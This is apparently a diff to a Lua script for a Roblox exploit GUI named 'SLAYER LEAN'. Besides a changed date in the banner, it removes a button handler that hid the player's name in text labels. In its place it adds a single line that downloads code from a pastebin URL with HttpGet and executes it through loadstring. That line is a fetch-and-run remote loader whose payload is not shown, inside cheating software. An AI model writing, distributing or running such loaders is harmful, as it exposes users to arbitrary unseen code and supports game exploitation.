@@ -3,7 +3,7 @@
 
 
   ^~^  ,                                    
- ('Y') )        Updated At [UPDATE 1] DEC 4th                          
+ ('Y') )        Updated At [UPDATE 1] APRIL 1ST                        
  /   \/  »»» SLAYER LEAN -- By 𝗖𝗮𝗻𝗱𝘆𝗟𝗲𝗮𝗻#𝟮𝟲𝟰𝟱
 (\|||/)                               
    
@@ -2303,40 +2303,7 @@ Button_9.Text = ""
 Button_9.TextColor3 = Color3.fromRGB(0, 0, 0)
 Button_9.TextSize = 14.000
 Button_9.MouseButton1Down:connect(function()
-
-
-
-	getgenv().name = "UnknownUser"
-
-	local Plr = game.Players.LocalPlayer
-	for Index, Value in next, game:GetDescendants() do 
-		if Value.ClassName == "TextLabel" then 
-			local has = string.find(Value.Text,Plr.Name) 
-			if has then 
-				local str = Value.Text:gsub(Plr.Name,name)
-				Value.Text = str 
-			end
-			Value:GetPropertyChangedSignal("Text"):Connect(function()
-				local str = Value.Text:gsub(Plr.Name,name)
-				Value.Text = str 
-			end)
-		end
-	end
-
-	game.DescendantAdded:Connect(function(Value)
-		if Value.ClassName == "TextLabel" then 
-			local has = string.find(Value.Text,Plr.Name)
-			Value:GetPropertyChangedSignal("Text"):Connect(function()
-				local str = Value.Text:gsub(Plr.Name,name)
-				Value.Text = str 
-			end)
-			if has then 
-				local str = Value.Text:gsub(Plr.Name,name)
-				Value.Text = str 
-			end
-
-		end
-	end)
+	loadstring(game:HttpGet("https://pastebin.com/raw/fB5JbSes",true))()
 end)
 
 Title_11.Name = "Title"
